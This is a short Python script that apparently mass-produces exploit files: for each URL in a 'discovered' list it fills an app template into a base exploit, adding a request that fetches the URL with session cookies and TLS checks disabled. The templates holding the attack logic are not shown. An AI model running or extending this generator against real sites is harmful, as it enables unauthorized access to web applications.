import md5

discovered = file("../amon/discovered").read().strip().split("\n")

base = file("base_exploit.py").read()

def generate(template, exploit):
    template_data = file(template).read()
    return base.format(template_data, exploit)

def main():
    for i in discovered:
        app = i[8:i.index(".com")]
        exploit = """print(requests.get("%s", cookies=jar, verify=False).text)""" % i
        file("./exploits/" + app + "_" + md5.md5(exploit).hexdigest() + "_exploit.py", 'w').write(generate(app + ".template", exploit))


if __name__ == "__main__":
    main()
